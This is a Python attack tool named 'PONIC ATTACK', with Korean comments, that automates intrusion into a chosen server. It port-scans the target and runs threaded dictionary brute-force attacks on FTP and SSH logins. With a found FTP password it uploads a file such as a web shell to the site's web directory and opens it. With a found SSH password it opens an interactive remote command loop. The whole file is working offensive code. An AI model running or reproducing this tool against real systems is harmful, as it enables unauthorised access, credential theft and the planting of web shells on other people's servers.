# !/usr/bin/env python3
# -*- coding: utf-8 -*-

from datetime import datetime
import queue
import threading
import ipaddress
import socket
import os
import ftplib
import webbrowser
import time
import paramiko
from paramiko import SSHClient, AutoAddPolicy
import logging
from colorama import Fore, init


class AutoAttack:
  def __init__(self):
    self.target = ""
    self.target_ports = []
    self.ftp_flag = False
    self.ftp_host = ""
    self.ftp_username = ""
    self.ftp_passwd = None
    self.ftp_redirect = "ls -al"
    # self.ftp_redirect = input("Input injection code : ")  #삽입할 코드 입력
    self.ftp_set_path = ""
    # self.ftp_set_path = "/home/" + self.ftp_username + "/public_html/master"
    self.upload_file = ""
    self.ssh_flag = False
    self.ssh_username = ""
    self.ssh_passwd = None
    self.ssh_code_inject = ""

    self.welcomeMenu()


  def welcomeMenu(self):
    print(">>>>>>>>>>>>>>>>>>>> PONIC ATTACK <<<<<<<<<<<<<<<<<<<<")
    self.target = input("Input target IP (ex. 192.168.0.34) : ")
    self.ftp_host = input("Input target FTP host (ex. www.kae.kr) : ")
    self.ftp_username = input("Input target FTP username (ex. aheun) : ")
    self.ftp_set_path = input("Input target FTP default path (ex. /home/aheun) : ")
    self.upload_file = input("Input target FTP want upload_file (ex. webshell.php) : ")
    self.ssh_username = input("Input target SSH username (ex. master) : ")


  ############### before attack, check is port open ###############
  def chkOpenPort(self, port):
    if port in self.target_ports:
      return True
    else:
      return False


  ############### scan target ports : scanner -> scanPort ###############
  def scanPort(self):
    while True:
      if q.empty():
        break

      port = q.get()
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      result = sock.connect_ex((self.target, port))

      if result == 0: # 포트가 열어져 있을 경우
        print("[+] Port " + str(port) + " is opened")
        self.target_ports.append(port)
      else:
        print("[-] Port " + str(port) + " is closed")
      
      sock.close()


  def scanner(self):
    print("\n\n>>>>>>>>>>>>>>>>>>>> PORT SCAN <<<<<<<<<<<<<<<<<<<<")
    global q
    threads = [] # 스레드 관리 목록
    chk_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5900]

    q = queue.Queue()

    # ping으로 확인
    print("CHECK ping " + self.target)
    alive = os.system("ping " + self.target)

    # 연결된다면 q에 확인할 포트 넣기
    if alive == 0:
      print()
      for port in chk_ports:
        q.put(port)
    else:
      print("can not find target")
      exit()

    for i in range(10):
      t = threading.Thread(target = self.scanPort)
      t.start()
      threads.append(t)

    # 모든 스레드가 종료될 때까지 대기
    for t in threads:
      t.join()

    print("\n[*] Found open ports: ", self.target_ports)


  ############### ftp attack : ftpAttack -> ftpBrute -> ftpInjection ###############
  def ftpBrute(self):
    while True:
      if q.empty():
        break
      if(self.ftp_flag):
        while(not q.empty()):
          q.get()
        break
      
      passwd = q.get()
      try:
        ftp_conn = ftplib.FTP(self.ftp_host)
        ftp_conn.login(self.ftp_username, passwd)
      except ftplib.error_perm:
        pass
      else:
        # correct credentials
        print("[*] Found credentials: " + passwd)
        ftp_conn.quit()
        self.ftp_passwd = passwd
        self.ftp_flag = True

  def returnDefault(self, ftp): #웹 페이지 파일 검색
    try:
      dirList = ftp.nlst() #현재 디렉토리 파일 확인
      print("dirList : ", dirList)
      return dirList
    except: 
      dirList = []
      print ('[-] Could not list directory contents.')
      print ('[-] Skipping To Next Target.')

    retList = []
    for fileName in dirList:
      fn = fileName.lower()
      if '.php' in fn or '.htm' in fn or '.asp' in fn:
          print ('[+] Found default page: ' + fileName)
          retList.append(fileName) #파일명 추가
    return retList


  # 서버에서 클라이언트로 파일 수신
  def getPage(self, ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write) #아스키모드에서 FTP서버에서 FTP 클라이언트로 파일수신
    print ("[+] Downloaded file : " + page) 
    f.write(redirect)
    f.close()


  # 클라이언트에서 서버로 파일 송신 (changePage, injectPage)
  ### 권한이 없으면 upload가 안됨,,! 예외처리 혹은 디렉터리 별 업로드 기능이 필요할 듯
  def changePage(self, ftp, before_page):
    print("[*] Changed " + before_page + " to " + self.upload_file)
    with open(self.upload_file, 'rb') as read_f:
      ftp.storlines('STOR ' + before_page, read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
    print ("[*] Changed " + before_page)


  def injectPage(self, ftp):
    print('[+] Injected Malicious file : ' + self.upload_file)
    with open(self.upload_file, 'rb') as read_f:
      ftp.storlines('STOR ' + self.upload_file, read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
    print ("[*] Uploaded injected file : " + self.upload_file)
    webbrowser.open("http://" + self.ftp_host + "/" + self.upload_file)


  def ftpInjection(self):
    ftp_conn = ftplib.FTP(self.ftp_host)
    ftp_conn.login(self.ftp_username, self.ftp_passwd)
    ftp_conn.cwd(self.ftp_set_path) # 설정한 경로로 이동
    defPages = self.returnDefault(ftp_conn) # 설정 경로의 웹 페이지들 확인

    self.injectPage(ftp_conn)
    # for defPage in defPages:
    #   self.getPage(ftp_conn, defPage, "ls -al")
    #   self.changePage(ftp_conn, defPage)


  def ftpAttack(self):
    print("\n\n>>>>>>>>>>>>>>>>>>>> FTP ATTACK <<<<<<<<<<<<<<<<<<<<")
    global q
    threads = [] # 스레드 관리 목록
    passwdFile = "dic_passwd.txt"

    q = queue.Queue()
    alive = self.chkOpenPort(21)

    if (alive):
      # dic_passwd.txt 읽어서 queue에 저장
      with open(passwdFile, 'rt') as f:
        passwds = f.readlines()
      for passwd in passwds:
        passwd = passwd.rstrip()
        q.put(passwd)

    for i in range(10):
      t = threading.Thread(target = self.ftpBrute)
      t.start()
      threads.append(t)

    # 모든 스레드가 종료될 때까지 대기
    for t in threads:
      t.join()
      
    # 확보한 pw로 공격진행
    if self.ftp_passwd != None:
        print('[+] Using creds: ' + self.ftp_username + '/' + self.ftp_passwd + ' to attack')
        self.ftpInjection()


  ############### ssh attack : sshAttack ->  ###############
  def sshBrute(self):
    while True:
      if q.empty():
        break

      if(self.ssh_flag):
        while(not q.empty()):
          q.get();
        break;
      
      passwd = q.get()
      print("*** ", passwd)

      try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        chk = ssh.connect(self.target, port=22, username=self.ssh_username, password=passwd)
      except Exception: # paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException
        pass
      else:
        # correct credentials
        print("[*] Found credentials: " + passwd)
        self.ssh_passwd = passwd
        self.ssh_flag = True


  def sshInjection(self):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    ssh.connect(self.target, port=22, username=self.ssh_username, password=self.ssh_passwd)

    while True:
      ssh_code_inject = input("Input injection code(finish -1) : ")
      if (ssh_code_inject == "-1"):
        break

      stdin, stdout, stderr = ssh.exec_command(ssh_code_inject)
      print("".join(stdout.readlines()))


  def sshAttack(self):
    print("\n\n>>>>>>>>>>>>>>>>>>>> SSH ATTACK <<<<<<<<<<<<<<<<<<<<")
    global q
    threads = [] # 스레드 관리 목록
    passwdFile = "dic_passwd.txt"

    q = queue.Queue()
    alive = self.chkOpenPort(22)

    if (alive):
      # dic_passwd.txt 읽어서 queue에 저장
      with open(passwdFile, 'rt') as f:
        passwds = f.readlines()
      for passwd in passwds:
        passwd = passwd.rstrip()
        q.put(passwd)

    for i in range(10):
      t = threading.Thread(target = self.sshBrute)
      t.start()
      threads.append(t)

    # 모든 스레드가 종료될 때까지 대기
    for t in threads:
      t.join()

    # 확보한 pw로 공격진행
    if self.ssh_passwd != None:
      print('[+] Using creds: ' + self.ssh_username + '/' + self.ssh_passwd + ' to attack')
      self.sshInjection()


def main():
  print("Start Program")
  
  a1 = AutoAttack()
  a1.scanner()
  a1.ftpAttack()
  a1.sshAttack()
  

if __name__ == "__main__":
  main()
